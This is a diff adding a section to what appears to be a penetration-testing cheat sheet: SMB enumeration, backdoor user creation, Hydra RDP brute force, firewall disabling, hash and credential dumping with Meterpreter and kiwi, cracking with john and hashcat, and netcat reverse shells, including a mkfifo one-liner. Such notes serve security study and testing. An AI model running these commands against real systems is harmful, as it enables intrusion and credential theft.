@@ -438,5 +438,125 @@ Additional Notes
 
 # SAMBA, WEB SERVER, STEG, FIREWALLS, NETCAT, GET/CRACK HASHES, SNMP, CREATE USER, SCANS, U&E
 
-##
+## Samba
+
+##### Enumeration
+```
+nmblookup -A [target]
+smbclient //MOUNT/share -I [target] -N
+rpcclient -U "" [target]
+enum4linux [target]
+```
+
+##### Mount Remote Windows Share
+```
+smbmount //[target IP]/c$ /mnt/remote -o username=[user],password=[password], rw
+```
+
+## Create a New User & Add to Group
+
+##### Linux
+```
+useradd -m -r [username]
+useradd -g [groupname] [username]
+passwd [username] (change pw for user)
+```
+
+##### Windows
+```
+net user [username] /add
+net localgroup [groupname] [username] /add
+```
+## Remote Desktop Access
+
+##### Hydra RDP Brute Force
+```
+hydra -l admin -P [pwfile] -S [IP] rdp
+```
+
+##### Meterpreter
+```
+run getgui -e
+```
+In a Terminal...
+```
+rdesktop [IP]
+vncviewer [IP]
+```
+
+## Firewalls
+
+##### Linux Firewall Info
+View Rules
+```
+iptables -nvL
+```
+Clear Rules (need priv)
+```
+iptables -F
+```
+
+##### Windows Firewall Info
+View Rules
+```
+netsh advfirewall firewall show rule name=all
+```
+Disable Firewall (need priv)
+```
+netsh firewall set opmode disable
+```
+
+## Working with Password Hashes
+
+##### Retrieve PW Hashes with meterpreter
+```
+hashdump (requires system)
+load kiwi, creds_all
+```
+
+##### Crack Passwords and Hashes with john
+```
+john [file] (optional: --wordlist=[file]
+```
+ensure you read outputs from john, check formats
+```
+rm ~/.john/* (do this after running john)
+```
+
+##### Crack Passwords and Hashes with Hashcat
+```
+hashcat -m 1000 -a 0 --force --show --username [hashfile] [wordlistfile]
+
+-m 1000 (specifies NTLM)
+-a 0 (straight attack mode)
+--force (ignore warnings)
+--show (show cracked hashes)
+--username (ignore usernames in hash file)
+```
+
+## netcat
+
+##### netcat Connection
+listener: `nc -lvp [port]`
+connect: `nc [IP] [port]`
+
+##### netcat File Transfer
+listener: `nc -l -p < [filename]`
+sender: `nc -w 3 [dst IP] [port] > [filename]`
+
+##### netcat Banner Grabbing
+```
+nc [IP] 80
+```
+
+##### netcat Reverse Shells
+attacker: `nc -lvp [port]`
+target: `nc -e /bin/sh [IP] [port]`
+
+If `-e` doesn't exist...
+attacker: `nc -lvp [port]`
+target: 
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc [IP] [port] >/tmp/f
+```
 
